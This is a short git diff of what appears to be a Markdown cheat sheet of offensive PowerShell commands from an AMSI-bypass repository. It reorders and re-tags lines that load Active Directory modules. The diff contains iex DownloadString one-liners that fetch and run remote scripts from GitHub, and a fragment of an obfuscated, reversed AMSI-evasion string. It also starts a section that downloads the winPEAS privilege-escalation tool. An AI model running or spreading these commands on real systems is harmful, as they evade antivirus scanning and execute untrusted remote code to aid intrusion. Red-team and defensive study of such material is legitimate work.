@@ -567,14 +567,14 @@ Sv  ('R9'+'HYt') ( " ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(e
 
 
 # 2. load ad-module
-```
-iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kh4sh3i/Amsi-Bypass/refs/heads/main/Import-AD.ps1');Import-AD
+```powershell
 iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
+iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kh4sh3i/Amsi-Bypass/main/Import-AD.ps1');Import-AD
 ```
 
 # 3. Windows Privilege Escalation Awesome Script (.exe)
 
-```
+```powershell
 # Get latest release
 $url = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
 
